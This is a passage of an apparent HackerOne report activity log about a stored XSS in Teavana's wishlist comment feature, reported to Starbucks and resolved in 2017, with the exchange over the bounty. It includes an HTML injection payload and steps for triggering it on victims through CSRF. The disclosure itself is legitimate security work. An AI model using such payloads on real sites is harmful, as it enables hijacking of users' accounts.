(wishlist-comments)"},"actor":{"username":"sharpie","cleared":false,"url":"/sharpie","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/093/272/b7429121474103e01ac6fabf477ddb52ed91556d_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1265673,"is_internal":false,"editable":false,"type":"Activities::BugReopened","message":"@faisalahmed  You may be right.. We'll investigate this and come back with an answer soon. Thanks for following up! ","markdown_message":"\u003cp\u003e\u003ca href=\"/faisalahmed\"\u003e@faisalahmed\u003c/a\u003e  You may be right.. We\u0026#39;ll investigate this and come back with an answer soon. Thanks for following up! \u003c/p\u003e\n","automated_response":false,"created_at":"2016-10-24T23:50:07.859Z","updated_at":"2016-10-24T23:50:07.859Z","actor":{"username":"sharpie","cleared":false,"url":"/sharpie","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/093/272/b7429121474103e01ac6fabf477ddb52ed91556d_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1267188,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Hey @faisalahmed \n\nI'm having a hard time reproducing this issue using your CSRF POC. I have replaced `id` with `C146867XXXX`(my ID) and when I click on submit to try your POC, I get sent to `https://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/Wishlist-Comments/C146867XXXX` and no `alert(1)` is popped up. Any ideas? ","markdown_message":"\u003cp\u003eHey \u003ca href=\"/faisalahmed\"\u003e@faisalahmed\u003c/a\u003e \u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;m having a hard time reproducing this issue using your CSRF POC. I have replaced \u003ccode\u003eid\u003c/code\u003e with \u003ccode\u003eC146867XXXX\u003c/code\u003e(my ID) and when I click on submit to try your POC, I get sent to \u003ccode\u003ehttps://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/Wishlist-Comments/C146867XXXX\u003c/code\u003e and no \u003ccode\u003ealert(1)\u003c/code\u003e is popped up. Any ideas? \u003c/p\u003e\n","automated_response":false,"created_at":"2016-10-25T19:14:47.765Z","updated_at":"2016-10-25T19:14:47.765Z","actor":{"username":"sharpie","cleared":false,"url":"/sharpie","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/093/272/b7429121474103e01ac6fabf477ddb52ed91556d_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1267216,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"1. add an item to the wish list.\n2. go to https://www.teavana.com/us/en/my-wishlist\n3. Click **ADD COMMENTS** on that wish-listed product.\n4. add `\u003c/textarea\u003e\u003cimg src=x onerror=alert(1)\u003e` as comment and save.\n5. it will say, **Your comment is saved**\n6. Now, click on **Edit Comments**\n7. XSS will be executed!","markdown_message":"\u003col\u003e\n\u003cli\u003eadd an item to the wish list.\u003c/li\u003e\n\u003cli\u003ego to \u003ca title=\"https://www.teavana.com/us/en/my-wishlist\" href=\"/redirect?url=https%3A%2F%2Fwww.teavana.com%2Fus%2Fen%2Fmy-wishlist\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.teavana.com/us/en/my-wishlist\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\n\u003c/li\u003e\n\u003cli\u003eClick \u003cstrong\u003eADD COMMENTS\u003c/strong\u003e on that wish-listed product.\u003c/li\u003e\n\u003cli\u003eadd \u003ccode\u003e\u0026lt;/textarea\u0026gt;\u0026lt;img src=x onerror=alert(1)\u0026gt;\u003c/code\u003e as comment and save.\u003c/li\u003e\n\u003cli\u003eit will say, \u003cstrong\u003eYour comment is saved\u003c/strong\u003e\n\u003c/li\u003e\n\u003cli\u003eNow, click on \u003cstrong\u003eEdit Comments\u003c/strong\u003e\n\u003c/li\u003e\n\u003cli\u003eXSS will be executed!\u003c/li\u003e\n\u003c/ol\u003e\n","automated_response":false,"created_at":"2016-10-25T19:25:28.006Z","updated_at":"2016-10-25T19:25:42.626Z","actor":{"username":"faisalahmed","cleared":true,"url":"/faisalahmed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/726/e66916f9112a11c1e97ec5ea0ad886121d14f38b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1267488,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Regarding the comment id, it changes every time. But the value of the comment id is incremental.\n\nSteps to reproduce:\n1. Go to your wishlist.\n2. Click on edit comment.\n3. Submit a new comment and intercept this request.\n4. You will find your present comment id in the intercepted URL of step 3.\n5. Use the comment id obtainted from step 4 in CSRF PoC\n6. If the payload is correct, xss should be triggered.\n","markdown_message":"\u003cp\u003eRegarding the comment id, it changes every time. But the value of the comment id is incremental.\u003c/p\u003e\n\n\u003cp\u003eSteps to reproduce:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eGo to your wishlist.\u003c/li\u003e\n\u003cli\u003eClick on edit comment.\u003c/li\u003e\n\u003cli\u003eSubmit a new comment and intercept this request.\u003c/li\u003e\n\u003cli\u003eYou will find your present comment id in the intercepted URL of step 3.\u003c/li\u003e\n\u003cli\u003eUse the comment id obtainted from step 4 in CSRF PoC\u003c/li\u003e\n\u003cli\u003eIf the payload is correct, xss should be triggered.\u003c/li\u003e\n\u003c/ol\u003e\n","automated_response":false,"created_at":"2016-10-25T20:59:15.677Z","updated_at":"2016-10-25T21:08:50.847Z","actor":{"username":"faisalahmed","cleared":true,"url":"/faisalahmed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/726/e66916f9112a11c1e97ec5ea0ad886121d14f38b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1267529,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for your quick reply @faisalahmed. We are currently reviewing this report. We'll update you soon! ","markdown_message":"\u003cp\u003eThank you for your quick reply \u003ca href=\"/faisalahmed\"\u003e@faisalahmed\u003c/a\u003e. We are currently reviewing this report. We\u0026#39;ll update you soon! \u003c/p\u003e\n","automated_response":false,"created_at":"2016-10-25T21:11:55.266Z","updated_at":"2016-10-25T21:11:55.266Z","actor":{"username":"sharpie","cleared":false,"url":"/sharpie","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/093/272/b7429121474103e01ac6fabf477ddb52ed91556d_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1273676,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Anything on this one?","markdown_message":"\u003cp\u003eAnything on this one?\u003c/p\u003e\n","automated_response":false,"created_at":"2016-10-28T23:24:30.787Z","updated_at":"2016-10-28T23:24:30.787Z","actor":{"username":"faisalahmed","cleared":true,"url":"/faisalahmed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/726/e66916f9112a11c1e97ec5ea0ad886121d14f38b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1273681,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @faisalahmed \n\nThank you for the follow up comment. As we mentioned in the last comment, we'll notify you once there's an update. Thanks! ","markdown_message":"\u003cp\u003eHey \u003ca href=\"/faisalahmed\"\u003e@faisalahmed\u003c/a\u003e \u003c/p\u003e\n\n\u003cp\u003eThank you for the follow up comment. As we mentioned in the last comment, we\u0026#39;ll notify you once there\u0026#39;s an update. Thanks! \u003c/p\u003e\n","automated_response":false,"created_at":"2016-10-28T23:28:10.538Z","updated_at":"2016-10-28T23:28:10.538Z","actor":{"username":"sharpie","cleared":false,"url":"/sharpie","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/093/272/b7429121474103e01ac6fabf477ddb52ed91556d_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1292089,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2016-11-09T20:18:00.173Z","updated_at":"2016-11-09T20:18:00.173Z","actor":{"username":"coldbr3w","cleared":false,"url":"/coldbr3w","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/109/209/dd6ef3a28f555d97d4d9c90c41c908d9b11daf47_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1292128,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks a lot for triaging this one, was eagerly waiting for an update of this.","markdown_message":"\u003cp\u003eThanks a lot for triaging this one, was eagerly waiting for an update of this.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-11-09T20:33:10.824Z","updated_at":"2016-11-09T20:33:10.824Z","actor":{"username":"faisalahmed","cleared":true,"url":"/faisalahmed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/726/e66916f9112a11c1e97ec5ea0ad886121d14f38b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1300759,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Any bounty decision on this one?","markdown_message":"\u003cp\u003eAny bounty decision on this one?\u003c/p\u003e\n","automated_response":false,"created_at":"2016-11-15T17:44:36.269Z","updated_at":"2016-11-15T17:44:36.269Z","actor":{"username":"faisalahmed","cleared":true,"url":"/faisalahmed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/726/e66916f9112a11c1e97ec5ea0ad886121d14f38b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1301178,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"@faisalahmed \n\nThank you for your submission. We are working on a fix and will contact you when it is time for a re-test.","markdown_message":"\u003cp\u003e\u003ca href=\"/faisalahmed\"\u003e@faisalahmed\u003c/a\u003e \u003c/p\u003e\n\n\u003cp\u003eThank you for your submission. We are working on a fix and will contact you when it is time for a re-test.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-11-15T21:43:06.323Z","updated_at":"2016-11-15T21:43:06.323Z","actor":{"url":"/starbucks","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Starbucks"}},"bounty_amount":"150.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"starbucks","collaborator":{"username":"faisalahmed","url":"/faisalahmed"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1301198,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"This is really a pathetic turnout for an xss issue. You have rewarded a csrf on the same endpoint with 375$ and rewarded the xss with 150$. Whereas, the xss itself is working as the csrf bypass, cause whenever the payload is used the payload is getting saved on the victims account. And how come a CSRF is more severe than the XSS? Please clarify.\n\nThis is not acceptable at all.","markdown_message":"\u003cp\u003eThis is really a pathetic turnout for an xss issue. You have rewarded a csrf on the same endpoint with 375$ and rewarded the xss with 150$. Whereas, the xss itself is working as the csrf bypass, cause whenever the payload is used the payload is getting saved on the victims account. And how come a CSRF is more severe than the XSS? Please clarify.\u003c/p\u003e\n\n\u003cp\u003eThis is not acceptable at all.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-11-15T21:52:47.770Z","updated_at":"2016-11-15T21:52:47.770Z","actor":{"username":"faisalahmed","cleared":true,"url":"/faisalahmed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/726/e66916f9112a11c1e97ec5ea0ad886121d14f38b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1426399,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Hi @faisalahmed,\n\nThis is @coldbr3w, I'd like to apologize for the mix up in classifying this bug. This issue should not have received such a low rating and bounty reward. After consulting with the team, we have decided to increase the bounty amount to a total of $375. We're also happy to share that the issue has been resolved since the wish list functionality has been deprecated. Please confirm that that XSS is no longer possible after saving an item to wishlist. The feature should have been removed from `teavana.com`.\n\nThank you for you patience and understanding.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/faisalahmed\"\u003e@faisalahmed\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThis is \u003ca href=\"/coldbr3w\"\u003e@coldbr3w\u003c/a\u003e, I\u0026#39;d like to apologize for the mix up in classifying this bug. This issue should not have received such a low rating and bounty reward. After consulting with the team, we have decided to increase the bounty amount to a total of $375. We\u0026#39;re also happy to share that the issue has been resolved since the wish list functionality has been deprecated. Please confirm that that XSS is no longer possible after saving an item to wishlist. The feature should have been removed from \u003ccode\u003eteavana.com\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eThank you for you patience and understanding.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-01-18T00:42:33.413Z","updated_at":"2017-01-18T00:42:33.413Z","actor":{"url":"/starbucks","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Starbucks"}},"bounty_amount":"225.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"starbucks","collaborator":{"username":"faisalahmed","url":"/faisalahmed"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1426400,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2017-01-18T00:42:46.485Z","updated_at":"2017-01-18T00:42:46.485Z","additional_data":{"old_severity":null,"new_severity":"Medium","old_severity_id":null,"new_severity_id":20100},"actor":{"username":"coldbr3w","cleared":false,"url":"/coldbr3w","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/109/209/dd6ef3a28f555d97d4d9c90c41c908d9b11daf47_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1426401,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2017-01-18T00:42:52.134Z","updated_at":"2017-01-18T00:42:52.134Z","actor":{"username":"coldbr3w","cleared":false,"url":"/coldbr3w","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/109/209/dd6ef3a28f555d97d4d9c90c41c908d9b11daf47_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"faisalahmed","url":"/faisalahmed"},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1426423,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @coldbr3w,\nI'm confirming the issue no longer reproduces for me.\nAnd the additional bounty is very much appreciated!\nThank you for running an amazing, transparent; yet professionally managed bounty program.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/coldbr3w\"\u003e@coldbr3w\u003c/a\u003e,\u003cbr\u003e\nI\u0026#39;m confirming the issue no longer reproduces for me.\u003cbr\u003e\nAnd the additional bounty is very much appreciated!\u003cbr\u003e\nThank you for running an amazing, transparent; yet professionally managed bounty program.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-01-18T00:59:19.579Z","updated_at":"2017-01-18T01:01:00.019Z","actor":{"username":"faisalahmed","cleared":true,"url":"/faisalahmed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/726/e66916f9112a11c1e97ec5ea0ad886121d14f38b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1474023,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-02-09T10:11:49.799Z","updated_at":"2017-02-09T10:11:49.799Z","first_to_agree":true,"actor":{"username":"faisalahmed","cleared":true,"url":"/faisalahmed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/726/e66916f9112a11c1e97ec5ea0ad886121d14f38b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1483681,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-02-13T22:48:34.641Z","updated_at":"2017-02-13T22:48:34.641Z","actor":{"username":"siren","cleared":false,"url":"/siren","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/043/496/422aa228af5a54db16d191c4bed22c984a6429f2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":1483682,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-02-13T22:48:34.678Z","updated_at":"2017-02-13T22:48:34.678Z","actor":{"username":"siren","cleared":false,"url":"/siren","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/043/496/422aa228af5a54db16d191c4bed22c984a6429f2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":true,"actor_is_concealed_member":true}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}